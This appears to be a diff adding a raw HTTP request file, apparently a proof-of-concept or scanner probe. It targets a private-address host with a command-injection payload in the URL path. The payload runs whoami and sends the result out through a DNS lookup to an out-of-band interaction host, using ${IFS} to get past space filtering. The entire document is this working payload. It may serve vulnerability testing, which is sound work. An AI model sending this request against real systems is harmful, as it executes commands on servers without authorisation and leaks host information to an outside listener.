@@ -1,0 +1,7 @@
+GET /$(ping$%7BIFS%7D-nc$%7BIFS%7D2$%7BIFS%7D%60whoami%60.%7B%7Binteractsh-url%7D%7D) HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
